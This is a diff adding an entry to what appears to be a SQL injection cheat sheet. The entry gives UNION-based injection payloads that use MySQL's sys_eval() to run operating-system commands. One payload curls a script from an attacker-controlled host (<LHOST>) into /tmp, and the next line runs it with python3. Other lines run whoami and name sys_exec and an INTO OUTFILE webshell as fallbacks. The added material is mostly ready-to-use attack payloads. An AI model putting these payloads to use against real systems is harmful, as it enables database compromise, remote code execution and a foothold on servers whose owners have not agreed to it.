@@ -47,3 +47,12 @@ Blind SQLi in an `ORDER BY` clause — you can't UNION or subquery there directl
 # swaps sort order between two known columns depending on whether the condition is true
 ```
 
+MySQL `sys_eval()` OS command execution via UNION (requires `sys` UDF or MariaDB with `lib_mysqludf_sys` installed):
+```sql
+-- determine column count first, then:
+' UNION SELECT null,null,null,null,sys_eval('whoami') -- //
+' UNION SELECT null,null,null,null,sys_eval('curl http://<LHOST>/shell.py -o /tmp/shell.py') -- //
+' UNION SELECT null,null,null,null,sys_eval('python3 /tmp/shell.py') -- //
+```
+If `sys_eval` is unavailable, try `sys_exec` (no output) or fall back to `INTO OUTFILE` webshell.
+
